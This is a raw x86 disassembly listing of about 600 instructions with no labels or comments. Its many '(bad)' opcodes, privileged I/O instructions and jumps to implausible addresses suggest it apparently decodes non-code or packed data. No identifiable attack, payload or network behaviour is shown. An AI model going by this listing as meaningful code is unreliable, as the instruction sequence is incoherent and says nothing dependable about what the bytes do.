  412ed6:	(bad)  
  412ed7:	xchg   ebx,eax
  412ed8:	jle    0x412ec1
  412eda:	jmp    0xaab905cb
  412edf:	dec    edx
  412ee0:	aad    0x54
  412ee2:	push   ss
  412ee3:	and    DWORD PTR ss:[eax+0x46f9a9cf],eax
  412eea:	div    DWORD PTR [esi-0x453a8782]
  412ef0:	daa    
  412ef1:	leave  
  412ef2:	nop
  412ef3:	nop
  412ef4:	add    al,0xe2
  412ef6:	out    0xe5,eax
  412ef8:	inc    ebp
  412ef9:	std    
  412efa:	push   esi
  412efb:	cmp    bl,bl
  412efd:	push   eax
  412efe:	stos   BYTE PTR es:[edi],al
  412eff:	mov    edx,0xba117d96
  412f04:	stos   BYTE PTR es:[edi],al
  412f05:	xchg   edi,eax
  412f06:	cmp    edi,DWORD PTR [ebp+0x56]
  412f09:	aad    0x2d
  412f0b:	push   edi
  412f0c:	add    eax,0xbada7c9f
  412f11:	and    eax,0xb9c45334
  412f16:	push   es
  412f17:	cdq    
  412f18:	(bad)  
  412f19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412f1a:	lea    eax,[ebx+0x7c7b42e3]
  412f20:	popf   
  412f21:	pop    ss
  412f22:	sub    DWORD PTR [edx],eax
  412f24:	inc    esp
  412f25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412f26:	imul   edi,ebx,0xe70eb16a
  412f2c:	sbb    ch,al
  412f2e:	outs   dx,DWORD PTR ds:[esi]
  412f2f:	fadd   st(3),st
  412f31:	cmp    DWORD PTR [ebx-0x4aadb519],eax
  412f37:	jle    0x412fb0
  412f39:	inc    ecx
  412f3a:	add    eax,0x345c9cc0
  412f3f:	popf   
  412f40:	sbb    DWORD PTR [ebp+0x6d],eax
  412f43:	xor    bl,BYTE PTR [ecx+0x173e218a]
  412f49:	cmp    ebp,DWORD PTR [esp+edx*1]
  412f4c:	mov    bl,BYTE PTR [eax+0x57b449a6]
  412f52:	mov    bl,0x4a
  412f54:	push   es
  412f55:	arpl   WORD PTR [ebp+0x9daefbb],ax
  412f5b:	push   esp
  412f5c:	and    edi,ebp
  412f5e:	rcl    DWORD PTR [edi+0x73],1
  412f61:	pushf  
  412f62:	std    
  412f63:	or     al,0x6b
  412f65:	xlat   BYTE PTR ds:[ebx]
  412f66:	xor    edx,edi
  412f68:	ins    DWORD PTR es:[edi],dx
  412f69:	pop    ecx
  412f6a:	jmp    0x412f2b
  412f6c:	fst    QWORD PTR [eax]
  412f6e:	retf   
  412f6f:	inc    ebx
  412f70:	scas   al,BYTE PTR es:[edi]
  412f71:	repnz push edx
  412f73:	fnsave [edi]
  412f75:	sub    edx,DWORD PTR gs:[ebp-0x18a42ad8]
  412f7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412f7d:	inc    edi
  412f7e:	icebp  
  412f7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412f80:	xchg   ebx,eax
  412f81:	mov    edi,0x5e45b1e5
  412f86:	fnsave [esi]
  412f88:	fsub   QWORD PTR [ecx+0x4e999a53]
  412f8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412f8f:	(bad)  
  412f90:	scas   eax,DWORD PTR es:[edi]
  412f91:	jne    0x412fbc
  412f93:	cmp    al,0xe4
  412f95:	cmp    al,0xc
  412f97:	in     al,dx
  412f98:	inc    esp
  412f99:	push   edi
  412f9a:	add    ebp,DWORD PTR [eax+0x45697a9d]
  412fa0:	sbb    al,0xee
  412fa2:	jbe    0x412fa4
  412fa4:	sbb    cl,BYTE PTR [edi+0x79]
  412fa7:	daa    
  412fa8:	fild   WORD PTR [edx+0x1a]
  412fab:	call   0x5a42ec2c
  412fb0:	scas   al,BYTE PTR es:[edi]
  412fb1:	or     al,0x78
  412fb3:	fdiv   QWORD PTR [edi]
  412fb5:	cmp    al,0x53
  412fb7:	pop    esi
  412fb8:	dec    dx
  412fba:	repz fdivr QWORD PTR [eax]
  412fbd:	test   DWORD PTR [ebx],esi
  412fbf:	inc    DWORD PTR [ebx+ebp*8]
  412fc2:	xor    eax,0xfce4432a
  412fc7:	and    DWORD PTR [edx-0x51],0x18
  412fcb:	lods   al,BYTE PTR ds:[esi]
  412fcc:	call   0xb8aa3fab
  412fd1:	mov    esi,0x6890e06f
  412fd6:	outs   dx,BYTE PTR ds:[esi]
  412fd7:	repnz adc eax,0x1d57759
  412fdd:	pop    esi
  412fde:	es (bad) 
  412fe0:	outs   dx,DWORD PTR ds:[esi]
  412fe1:	jmp    0x413030
  412fe3:	push   es
  412fe4:	push   esp
  412fe5:	push   esp
  412fe6:	mov    ebp,0x1b982a9f
  412feb:	mov    ebx,0x56515b5a
  412ff0:	pushf  
  412ff1:	or     al,0xe9
  412ff3:	in     al,dx
  412ff4:	idiv   BYTE PTR [ecx+0x4c53c2e2]
  412ffa:	sub    bl,BYTE PTR [ebx-0x29]
  412ffd:	add    ebp,DWORD PTR [ecx]
  412fff:	or     BYTE PTR [ecx],bl
  413001:	mov    edx,0x1e467cb6
  413006:	pop    ss
  413007:	popf   
  413008:	(bad)  
  413009:	cmc    
  41300a:	inc    ecx
  41300b:	(bad)  
  41300c:	out    dx,al
  41300d:	arpl   bx,di
  41300f:	or     eax,0x3bc993f0
  413014:	push   ecx
  413015:	sub    al,0x67
  413017:	fmul   QWORD PTR [ebp+0x3ac1a21a]
  41301d:	add    al,0xdb
  41301f:	push   edx
  413020:	js     0x41308c
  413022:	adc    eax,0x5aa13112
  413027:	cli    
  413028:	push   esi
  413029:	mov    edx,DWORD PTR [ebx-0x38419f42]
  41302f:	call   0x9655:0x43bc878a
  413036:	fimul  DWORD PTR [esi-0x20a4e8ec]
  41303c:	push   ss
  41303d:	xchg   esi,eax
  41303e:	lds    edx,FWORD PTR ds:0xf0231f25
  413044:	divps  xmm7,XMMWORD PTR [eax+0x6f1f3923]
  41304b:	lea    edi,[ecx-0x3f]
  41304e:	fs jmp 0x2a29:0x8274fd6d
  413056:	jnp    0x413076
  413058:	idiv   BYTE PTR [edi+0x78]
  41305b:	outs   dx,DWORD PTR ds:[esi]
  41305c:	ss add eax,0x1f2a9ac6
  413062:	sub    ebp,DWORD PTR [eax+0xa25a444]
  413068:	into   
  413069:	lea    eax,[edi+0x7f]
  41306c:	push   esi
  41306d:	pop    DWORD PTR [eax]
  41306f:	and    BYTE PTR [esi-0x59be0a1c],ch
  413075:	push   ss
  413076:	mov    cl,0x23
  413078:	pop    ebx
  413079:	stos   BYTE PTR es:[edi],al
  41307a:	out    0x83,al
  41307c:	cdq    
  41307d:	jb     0x4130bc
  41307f:	jecxz  0x413052
  413081:	cmp    BYTE PTR [eax+0x3104e36b],bh
  413087:	sbb    al,0xd3
  413089:	dec    esi
  41308a:	div    DWORD PTR [ebp-0x69efe0d2]
  413090:	les    edi,FWORD PTR [ecx]
  413092:	fmul   st(0),st
  413094:	cwde   
  413095:	and    eax,ebx
  413097:	jnp    0x413113
  413099:	fisub  DWORD PTR [esi]
  41309b:	aam    0x32
  41309d:	ds push ss
  41309f:	xor    al,0x72
  4130a1:	jnp    0x41309c
  4130a3:	imul   esi,DWORD PTR [esi],0xcb2f3647
  4130a9:	into   
  4130aa:	mov    dl,0x70
  4130ac:	test   BYTE PTR [esi+0x41],cl
  4130af:	xchg   DWORD PTR [esi+0x10],edi
  4130b2:	pop    ecx
  4130b3:	pop    ds
  4130b4:	push   es
  4130b5:	mov    BYTE PTR [eax+0x62],ah
  4130b8:	std    
  4130b9:	push   esp
  4130ba:	stos   BYTE PTR es:[edi],al
  4130bb:	into   
  4130bc:	sub    eax,0x6b2ce271
  4130c1:	test   eax,0xcef60a1d
  4130c6:	or     ah,BYTE PTR [esi+0xaf26f45]
  4130cc:	pop    edi
  4130cd:	adc    bl,BYTE PTR [edi-0x2b]
  4130d0:	call   0xdd70b42e
  4130d5:	sub    ch,BYTE PTR [edx-0x16]
  4130d8:	outs   dx,BYTE PTR ds:[esi]
  4130d9:	div    BYTE PTR ds:0xe88cca37
  4130df:	clc    
  4130e0:	add    BYTE PTR [eax-0x2b],0xd5
  4130e4:	test   BYTE PTR [ebx+0x401cec70],0x1b
  4130eb:	shl    BYTE PTR [eax-0x7e71b05d],1
  4130f1:	inc    esi
  4130f2:	enter  0xd156,0xd3
  4130f6:	(bad)  
  4130f7:	je     0x413110
  4130f9:	mov    DWORD PTR [esp+edi*8+0x623028d0],ecx
  413100:	je     0x41317c
  413102:	mov    bl,0x49
  413104:	gs ror esp,cl
  413107:	inc    DWORD PTR [ebx+0x72]
  41310a:	imul   esi,DWORD PTR [esi],0xafdb9105
  413110:	das    
  413111:	rcl    BYTE PTR [esi],1
  413113:	or     eax,0x5a99023f
  413118:	sub    al,al
  41311a:	sub    ebx,DWORD PTR [edi]
  41311c:	cmp    al,0x80
  41311e:	jge    0x4130b3
  413120:	cmp    cl,BYTE PTR [ecx]
  413122:	cli    
  413123:	sub    al,BYTE PTR [edx]
  413125:	ins    DWORD PTR es:[edi],dx
  413126:	fcmovbe st,st(7)
  413128:	mov    BYTE PTR [edx+0x51e52ff],dh
  41312e:	sbb    al,BYTE PTR cs:[edx+0xe4af05a]
  413135:	push   ebx
  413136:	push   cs
  413137:	or     cl,BYTE PTR [edx]
  413139:	push   edx
  41313a:	push   0x10198d67
  41313f:	sahf   
  413140:	mov    bh,0x3c
  413142:	mov    ds:0xeaca75bd,eax
  413147:	test   BYTE PTR [edi+0x70],cl
  41314a:	jg     0x4130d4
  41314c:	mov    es,WORD PTR [esi]
  41314e:	push   esp
  41314f:	dec    ecx
  413150:	loop   0x413101
  413152:	adc    eax,DWORD PTR [ecx+0x5ba220b4]
  413158:	push   eax
  413159:	cld    
  41315a:	push   es
  41315b:	mov    ds:0x8ec31c10,al
  413160:	orps   xmm6,XMMWORD PTR [ebx]
  413163:	test   eax,0x53e5147f
  413168:	mov    ah,0xbc
  41316a:	ins    DWORD PTR es:[edi],dx
  41316b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41316c:	loop   0x4131e8
  41316e:	xor    DWORD PTR [edi],ebp
  413170:	xor    esp,edx
  413172:	out    dx,al
  413173:	fld    st(5)
  413175:	dec    edx
  413176:	sub    DWORD PTR [esp+ebx*8-0x73],edx
  41317a:	mov    ch,0x5d
  41317c:	in     eax,dx
  41317d:	stos   BYTE PTR es:[edi],al
  41317e:	push   ecx
  41317f:	add    bl,BYTE PTR [edi]
  413181:	(bad)  
  413182:	cmc    
  413183:	popa   
  413184:	add    eax,0xa9b01ab3
  413189:	pop    eax
  41318a:	(bad)  
  41318b:	and    eax,0x6e59242b
  413190:	mov    bl,0xdf
  413192:	jb     0x41312a
  413194:	lahf   
  413195:	mov    eax,0xe24c47a
  41319a:	outs   dx,DWORD PTR ds:[esi]
  41319b:	ins    BYTE PTR es:[edi],dx
  41319c:	call   0x7e30fd00
  4131a1:	(bad)  
  4131a2:	imul   eax,edx,0x4e
  4131a5:	jno    0x413185
  4131a7:	push   es
  4131a8:	push   ebp
  4131a9:	lock mov al,ds:0x1be4b0a4
  4131af:	sub    esi,DWORD PTR [edx-0x12d43cb0]
  4131b5:	enter  0x8e38,0xc6
  4131b9:	cwde   
  4131ba:	push   ds
  4131bb:	sub    DWORD PTR [esi+0x7d],ebp
  4131be:	dec    DWORD PTR [esi+0x6e]
  4131c1:	scas   eax,DWORD PTR es:[edi]
  4131c2:	retf   
  4131c3:	std    
  4131c4:	xchg   esp,eax
  4131c5:	fistp  QWORD PTR [edx+ebp*1]
  4131c8:	cmp    ah,BYTE PTR [ebp+0x1af771a7]
  4131ce:	lea    ebp,[ebp+0x11]
  4131d1:	and    al,0xfb
  4131d3:	push   esp
  4131d4:	loope  0x413242
  4131d6:	push   ds
  4131d7:	je     0x413225
  4131d9:	int    0x1c
  4131db:	shr    DWORD PTR [ebx+edi*2-0x3d],1
  4131df:	sub    eax,0xb02e0a94
  4131e4:	clc    
  4131e5:	iret   
  4131e6:	or     BYTE PTR [ebx+0x59],dh
  4131e9:	in     eax,dx
  4131ea:	lods   eax,DWORD PTR ds:[esi]
  4131eb:	pop    ss
  4131ec:	lahf   
  4131ed:	mov    eax,0xccbd28c2
  4131f2:	jmp    0xf28ddbe2
  4131f7:	ins    BYTE PTR es:[edi],dx
  4131f8:	retf   
  4131f9:	and    BYTE PTR [edx-0x3a],0x3c
  4131fd:	pop    ebx
  4131fe:	inc    esi
  4131ff:	cld    
  413200:	cmp    dl,BYTE PTR [eax]
  413202:	add    ebx,DWORD PTR [eax-0x487178a8]
  413208:	and    esp,DWORD PTR [edx]
  41320a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41320b:	mov    esi,0x631725c1
  413210:	jae    0x4131e2
  413212:	sub    eax,0x87ccbb47
  413217:	mov    edi,0x2b17f62e
  41321c:	dec    edi
  41321d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41321e:	(bad)  
  41321f:	mov    bh,0x50
  413221:	mov    dh,0xcc
  413223:	lea    esp,[esi+0x66d6b06e]
  413229:	or     DWORD PTR [eax+0x2148a7de],eax
  41322f:	jnp    0x4131eb
  413231:	mov    BYTE PTR ds:0xf418a4dd,0xcd
  413238:	fwait
  413239:	xor    dh,BYTE PTR [ebp+0x176869d0]
  41323f:	cmp    eax,0x580a2f6b
  413244:	push   ds
  413245:	fldenv [ebp+0x67]
  413248:	xchg   esp,eax
  413249:	sub    BYTE PTR [edx+esi*2+0x53bdb232],bh
  413250:	popf   
  413251:	push   es
  413252:	adc    DWORD PTR ds:0x51376aba,ebp
  413258:	es scas eax,DWORD PTR es:[edi]
  41325a:	ja     0x41329f
  41325c:	sub    eax,0xdc8e29c6
  413261:	cmp    al,0x91
  413263:	and    DWORD PTR ds:0xbd84ad2b,eax
  413269:	jmp    0xcd729d83
  41326e:	ret    
  41326f:	sub    DWORD PTR [ecx+0x780f91c1],ecx
  413275:	in     eax,0x4c
  413277:	add    al,0x41
  413279:	pop    edi
  41327a:	aas    
  41327b:	in     eax,dx
  41327c:	push   esp
  41327d:	mov    WORD PTR [ebp+0x2b2e7fab],?
  413283:	add    bl,BYTE PTR [eax]
  413285:	shl    BYTE PTR [ecx],0xd4
  413288:	scas   eax,DWORD PTR es:[edi]
  413289:	sar    bl,1
  41328b:	popa   
  41328c:	pop    ss
  41328d:	xchg   esp,eax
  41328e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41328f:	jp     0x41330b
  413291:	xchg   BYTE PTR [esi-0x74b1f53a],ch
  413297:	cld    
  413298:	inc    esi
  413299:	repnz int3 
  41329b:	test   eax,0xed766b89
  4132a0:	fs jb  0x4132b0
  4132a3:	test   BYTE PTR [ebx],al
  4132a5:	sub    edi,DWORD PTR [eax+edx*1-0x70]
  4132a9:	xlat   BYTE PTR ds:[ebx]
  4132aa:	lahf   
  4132ab:	sar    BYTE PTR [edi+0x6bf7ff9b],1
  4132b1:	sbb    al,0x7f
  4132b3:	fbstp  TBYTE PTR [ebp+0x76e5ea70]
  4132b9:	push   cs
  4132ba:	ja     0x41330f
  4132bc:	int    0x56
  4132be:	(bad)  
  4132bf:	sti    
  4132c0:	out    dx,al
  4132c1:	call   0x953562ca
  4132c6:	mov    al,0x54
  4132c8:	ror    ebx,1
  4132ca:	ins    BYTE PTR es:[edi],dx
  4132cb:	jp     0x4132ff
  4132cd:	shr    bh,0x7d
  4132d0:	popf   
  4132d1:	pop    ebx
  4132d2:	fisttp DWORD PTR [ebx-0x38]
  4132d5:	pop    ebx
  4132d6:	xchg   edx,eax
  4132d7:	and    BYTE PTR [edi+0x2a],bh
  4132da:	dec    eax
  4132db:	ret    
  4132dc:	(bad)  
  4132dd:	fcomp  DWORD PTR [edx]
  4132df:	cli    
  4132e0:	mov    edx,DWORD PTR [eax]
  4132e2:	out    dx,al
  4132e3:	aaa    
  4132e4:	pop    edx
  4132e5:	push   esp
  4132e6:	xchg   bl,ch
  4132e8:	mov    eax,DWORD PTR [esi+0x47]
  4132eb:	(bad)  
  4132ed:	pop    edi
  4132ee:	cli    
  4132ef:	or     eax,0x923ffd8c
  4132f4:	mov    ds:0xcacefab6,al
  4132f9:	xor    DWORD PTR [edx+0x1afe71d5],edi
  4132ff:	mov    edx,0xdb5f0735
  413304:	add    DWORD PTR [edx+0x2f],0x53
  413308:	sti    
  413309:	mov    ah,0x67
  41330b:	inc    eax
  41330c:	icebp  
  41330d:	mov    cl,0xfe
  41330f:	jb     0x41334a
  413311:	dec    ebp
  413312:	mov    al,BYTE PTR [esi-0x59]
  413315:	dec    esi
  413316:	repnz mov dh,0x14
  413319:	and    al,0x33
  41331b:	jo     0x4132c2
  41331d:	dec    ebp
  41331e:	xchg   ebx,eax
  41331f:	imul   bh
  413321:	push   es
  413322:	in     al,dx
  413323:	dec    esi
  413324:	mov    ebx,0xe1b629
  413329:	jp     0x413372
  41332b:	xlat   BYTE PTR ds:[ebx]
  41332c:	lea    ecx,[ecx-0x15]
  41332f:	or     ch,BYTE PTR ds:0x3fa31327
  413335:	fsub   DWORD PTR [edi+0x6a]
  413338:	in     al,dx
  413339:	(bad)  
  41333a:	repz jb 0x41331a
  41333d:	cmp    bl,dh
  41333f:	xchg   ecx,eax
  413340:	pop    ecx
  413341:	lds    ebp,FWORD PTR [ebp+edi*1-0x1f]
  413345:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413346:	fs push eax
  413348:	mov    DWORD PTR [ecx],edx
  41334a:	mov    ds:0x7ca60727,al
  41334f:	out    dx,al
  413350:	mov    ebp,0xd520e8c
  413355:	int3   
  413356:	rol    DWORD PTR [ecx],1
  413358:	add    al,0xdb
  41335a:	dec    ecx
  41335b:	repz into 
  41335d:	aad    0x86
  41335f:	int    0x8d
  413361:	sub    eax,0x8add4897
  413366:	shr    DWORD PTR [edi],0x10
  413369:	cld    
  41336a:	pop    eax
  41336b:	mov    bh,0xef
  41336d:	sub    al,0x9b
  41336f:	aaa    
  413370:	pop    edx
  413371:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413372:	loope  0x41338e
  413374:	push   edx
  413375:	add    eax,0x9efe57ab
  41337a:	ror    DWORD PTR [ecx+0xc],0x51
  41337e:	or     eax,0xb00b6309
  413383:	jne    0x413353
  413385:	inc    edx
  413386:	mov    al,ds:0x3670020b
  41338b:	shr    BYTE PTR [edx],cl
  41338d:	mov    ds:0xb9567865,eax
  413392:	aaa    
  413393:	dec    edi
  413394:	xchg   ebp,eax
  413395:	push   esi
  413396:	sub    ch,bl
  413398:	inc    esp
  413399:	stos   DWORD PTR es:[edi],eax
  41339a:	bound  edx,QWORD PTR [edx+0x53]
  41339d:	bound  ebx,QWORD PTR [ecx+0x2eec52d8]
  4133a3:	and    DWORD PTR [ebx],0xffffffbb
  4133a6:	sbb    edi,edx
  4133a8:	sbb    ebp,DWORD PTR [edx]
  4133aa:	es push eax
  4133ac:	js     0x413403
  4133ae:	sbb    ecx,eax
  4133b0:	add    edx,DWORD PTR [edx+0x12]
  4133b3:	sub    DWORD PTR [eax],ecx
  4133b5:	jl     0x41338a
  4133b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4133b8:	pop    es
  4133b9:	inc    edx
  4133ba:	aas    
  4133bb:	mov    edx,0x79f9af59
  4133c0:	adc    BYTE PTR [edi+esi*2],bl
  4133c3:	ret    
  4133c4:	mov    eax,0xc37f1807
  4133c9:	mov    edi,0x50a1c4d7
  4133ce:	aaa    
  4133cf:	enter  0xce89,0x6d
  4133d3:	clc    
  4133d4:	mov    ch,0xaa
  4133d6:	xchg   edi,eax
  4133d7:	dec    ebp
  4133d8:	adc    ecx,DWORD PTR [ebp+0x60697beb]
  4133de:	mov    ecx,0xc7bbe474
  4133e3:	push   es
  4133e4:	(bad)  
  4133e6:	jge    0x4133c5
  4133e8:	mov    ds:0xe54d018c,al
  4133ed:	(bad)  
  4133ee:	ds jmp 0xfa784f9a
  4133f4:	lods   al,BYTE PTR ds:[esi]
  4133f5:	jecxz  0x41345e
  4133f7:	loope  0x41339c
  4133f9:	xchg   ebp,eax
  4133fa:	mov    gs,WORD PTR [ebx+0x2506d2e9]
  413400:	sahf   
  413401:	mov    ebp,0xf11eb43b
  413406:	fsub   DWORD PTR [edi]
  413408:	sub    al,0x13
  41340a:	inc    ebx
  41340b:	sub    DWORD PTR [esi+eax*2+0x314eac29],eax
  413412:	cmp    eax,0x19356f1a
  413417:	fldcw  WORD PTR [esi-0x5585a0f7]
  41341d:	xchg   edi,eax
  41341e:	sub    eax,0xc7628674
  413423:	mov    dh,0xf6
  413425:	mov    ch,BYTE PTR [ecx-0x52]
  413428:	inc    esi
  413429:	jno    0x41349b
  41342b:	and    eax,0x812a1a85
  413430:	mov    al,0x24
  413432:	xchg   BYTE PTR [edi+0x59],dl
  413435:	fist   DWORD PTR [ebx+ebx*1+0x69]
  413439:	ffree  st(5)
  41343b:	mov    edx,DWORD PTR [edx+0x70e645af]
  413441:	daa    
  413442:	ror    eax,1
  413444:	jne    0x413480
  413446:	cdq    
  413447:	cld    
  413448:	icebp  
  413449:	jns    0x413447
  41344b:	ja     0x413402
  41344d:	dec    edi
  41344e:	test   BYTE PTR [ebx],bh
  413450:	pop    esp
  413451:	(bad)  
  413452:	fiadd  DWORD PTR [eax+ebp*4+0x503d6316]
  413459:	sub    BYTE PTR ds:0x63cb2a0c,0x25
  413460:	push   ecx
  413461:	ins    BYTE PTR es:[edi],dx
  413462:	pop    ebp
  413463:	es into 
  413465:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413466:	push   ecx
  413467:	xchg   ecx,eax
  413468:	shr    DWORD PTR [edx],cl
  41346a:	add    eax,0x4c449139
  41346f:	dec    esi
  413470:	xchg   BYTE PTR [ecx],ah
  413472:	call   0xf2e0af7a
  413477:	lods   eax,DWORD PTR ds:[esi]
  413478:	out    dx,eax
  413479:	mov    ch,0xb8
  41347b:	in     eax,dx
  41347c:	push   ebx
  41347d:	pop    eax
  41347e:	mov    esi,0x8a2bf048
  413483:	sar    BYTE PTR [edx],1
  413485:	xor    eax,0xc697dfd2
  41348a:	out    0x64,al
  41348c:	add    ecx,ebp
  41348e:	add    dh,bl
  413490:	repnz aam 0x33
  413493:	cld    
  413494:	jo     0x413446
  413496:	jb     0x4134bc
  413498:	pushf  
  413499:	outs   dx,DWORD PTR ds:[esi]
  41349a:	pop    ebx
  41349b:	div    BYTE PTR [edx+esi*2]
  41349e:	pop    ss
  41349f:	in     al,dx
  4134a0:	(bad)  
  4134a1:	mov    ah,0x9a
  4134a3:	inc    eax
  4134a4:	mov    DWORD PTR [ebp-0x4b],esp
  4134a7:	fist   DWORD PTR [esi-0x1a2d3f7d]
  4134ad:	pop    ebx
  4134ae:	mov    ds:0x7c8a7e57,al
  4134b3:	cmp    eax,0xbed2237f
  4134b8:	and    bp,WORD PTR [eax]
  4134bb:	and    esp,DWORD PTR [ebp+0x4f]
  4134be:	test   BYTE PTR [ebx+0x4f],al
  4134c1:	push   edi
  4134c2:	test   al,0xe6
  4134c4:	cmp    al,0xc7
  4134c6:	push   0x49
  4134c8:	(bad)  
  4134c9:	push   0xc57d298f
  4134ce:	(bad)  
  4134cf:	stos   DWORD PTR es:[edi],eax
  4134d0:	add    eax,0x25e9e52
  4134d5:	lds    ecx,FWORD PTR [edi-0x1cf4517b]
  4134db:	(bad)  
  4134dc:	jmp    0x83e5f40
  4134e1:	dec    eax
  4134e2:	in     al,0x73
  4134e4:	stos   DWORD PTR es:[edi],eax
  4134e5:	dec    edx
  4134e6:	push   esp
  4134e7:	sub    eax,0x62aab71f
  4134ec:	jo     0x413502
  4134ee:	test   BYTE PTR [edi-0x34c9e818],0x21
  4134f5:	enter  0x493f,0xf
  4134f9:	jmp    0x413556
  4134fb:	cmp    bh,BYTE PTR [eax+0x44]
  4134fe:	adc    al,0xa8
  413500:	fcomp  DWORD PTR [esi]
  413502:	pop    eax
  413503:	or     BYTE PTR [edx+edx*4+0x21],dl
  413507:	ja     0x4134dd
  413509:	pop    eax
  41350a:	jecxz  0x41357c
  41350c:	or     al,BYTE PTR [esp+eiz*4]
  41350f:	xchg   ebp,eax
  413510:	xchg   edi,eax
  413511:	js     0x4134fa
  413513:	push   ss
  413514:	push   ecx
  413515:	mov    bl,dl
  413517:	fcomp  st(3)
  413519:	stos   BYTE PTR es:[edi],al
  41351a:	or     al,0xf9
  41351c:	(bad)  
  41351d:	lock pop ecx
  41351f:	mov    esp,0x57333bc
  413524:	and    esp,esp
  413526:	ins    BYTE PTR es:[edi],dx
  413527:	jmp    0x3907:0x92ae0258
  41352e:	(bad)  
  41352f:	cs scas eax,DWORD PTR es:[edi]
  413531:	shl    esp,cl
  413533:	idiv   al
  413535:	lock in eax,0x99
  413538:	jecxz  0x413563
  41353a:	jnp    0x4135b5
  41353c:	test   al,0xb2
  41353e:	stos   DWORD PTR es:[edi],eax
  41353f:	clc    
  413540:	mov    DWORD PTR [ebp-0x29aa06d5],0xc63d3974
  41354a:	bound  edi,QWORD PTR ss:[edx+0x35f943a3]
  413551:	add    ebx,DWORD PTR [eax-0x7c]
  413554:	(bad)
  413557:	inc    edi
  413558:	aaa    
  413559:	cmp    esi,DWORD PTR [ebx+edi*2+0x52771b08]
  413560:	mov    ss,WORD PTR [ecx+0x3c]
  413563:	cld    
  413564:	xlat   BYTE PTR ds:[ebx]
  413565:	sbb    eax,0x50a1d4d9
  41356a:	(bad)  
  41356b:	imul   edx,DWORD PTR [eax+0x1ffc461f],0xd3967e7a
  413575:	mov    esi,0x3dd3555a
  41357a:	push   esi
  41357b:	inc    ch
  41357d:	loope  0x413502
  41357f:	outs   dx,DWORD PTR ds:[esi]
  413580:	mov    eax,0x45760af2
  413585:	leave  
  413586:	mov    ds:0x10c52eb3,al
  41358b:	outs   dx,DWORD PTR ds:[esi]
  41358c:	mov    bh,0x45
  41358e:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  413590:	adc    al,bl
  413592:	mov    ebp,0x84dcc04f
  413597:	push   ss
  413598:	add    dh,BYTE PTR [ecx-0x77]
  41359b:	sub    DWORD PTR [eax+0x164722e1],eax
  4135a1:	mov    ebx,0x8a2c93e5
  4135a6:	out    0x37,al
  4135a8:	(bad)  [edi-0x33a65cba]
  4135ae:	xchg   ebx,eax
  4135af:	fadd   DWORD PTR [esi+0x2fe63f54]
  4135b5:	push   0x9cc315b9
  4135ba:	frstor [ecx+esi*2-0x26]
  4135be:	sub    al,0x63
  4135c0:	(bad)  
  4135c1:	sbb    DWORD PTR [edx-0x1c],0x4c5f3c24
  4135c8:	nop
  4135c9:	pop    ss
  4135ca:	or     DWORD PTR [edx],0x8e760ea0
  4135d0:	xchg   ebx,eax
  4135d1:	addr16 pop ebx
  4135d3:	clc    
  4135d4:	adc    al,0x51
  4135d6:	xlat   BYTE PTR ds:[ebx]
  4135d7:	ret    0x35e7
  4135da:	fiadd  WORD PTR [eax]
  4135dc:	cmp    BYTE PTR [ebx+0xbcfe15a],0xe3
  4135e3:	(bad)  
  4135e4:	inc    ebp
  4135e5:	mov    eax,0xd546d848
  4135ea:	xchg   esi,eax
  4135eb:	inc    edi
  4135ec:	sar    DWORD PTR [ebp+0x72],cl
  4135ef:	mov    ds:0xe68a6b42,eax
  4135f4:	mul    DWORD PTR [edi]
  4135f6:	push   esp
  4135f7:	outs   dx,DWORD PTR ds:[esi]
  4135f8:	mov    eax,0x891dacda
  4135fd:	sub    bl,BYTE PTR [eax+0x10]
  413600:	cmc    
  413601:	adc    dh,dh
  413603:	jp     0x4135b6
  413605:	fneni(8087 only) 
  413607:	pop    es
  413608:	and    dl,bl
  41360a:	mov    bh,0xf9
  41360c:	xor    eax,0x3f22de5a
  413611:	xor    bl,cl
  413613:	stc    
  413614:	inc    ebx
  413615:	jno    0x41361c
  413617:	es xchg edx,eax
  413619:	xchg   BYTE PTR [ecx+0x75],ch
  41361c:	sub    al,0x8b
  41361e:	mov    al,0x7b
  413620:	popf   
  413621:	cmp    eax,0x3b87552f
  413626:	xor    cl,ah
  413628:	scas   al,BYTE PTR es:[edi]
  413629:	and    eax,0x25c262dd
  41362e:	pop    ds
  41362f:	scas   al,BYTE PTR es:[edi]
  413630:	jl     0x413670
  413632:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413633:	ss xchg esi,eax
  413635:	inc    ebx
  413636:	shrd   edx,ebp,0xd2
  41363a:	rcl    DWORD PTR [edx+0xe3594ec],1
  413640:	out    dx,al
  413641:	(bad)  
  413642:	hlt    
  413643:	int3   
  413644:	retf   0x6f83
  413647:	add    BYTE PTR [ebx-0x11bf32cc],0xe5
  41364e:	xor    al,BYTE PTR [ebp+0x0]
  413651:	sbb    bl,BYTE PTR [ebx]
  413653:	push   0xffffff98
  413655:	aad    0xec
  413657:	and    al,0xfb
  413659:	dec    eax
  41365a:	in     eax,dx
  41365b:	lods   al,BYTE PTR ds:[esi]
  41365c:	xor    al,0x5b
  41365e:	mov    DWORD PTR [ebx-0x77c86309],edx
  413664:	push   0x171164d5
  413669:	sar    BYTE PTR [edi-0x4],0x14
  41366d:	repnz outs dx,BYTE PTR ds:[esi]
  41366f:	scas   eax,DWORD PTR es:[edi]
  413670:	in     eax,0xb5
  413672:	and    eax,0x107096c8
  413677:	xor    DWORD PTR [ebx-0x5a85646f],ebx
  41367d:	push   edi
  41367e:	jecxz  0x413676
  413680:	push   es
  413681:	mov    ebp,0xe92a5f6f
  413686:	pop    eax
  413687:	jmp    0x413706
  413689:	aad    0x86
  41368b:	pop    ss
  41368c:	test   al,0x4f
  41368e:	(bad)  
  41368f:	adc    al,0x1c
  413691:	and    al,BYTE PTR cs:[eax+0x2012eb6d]
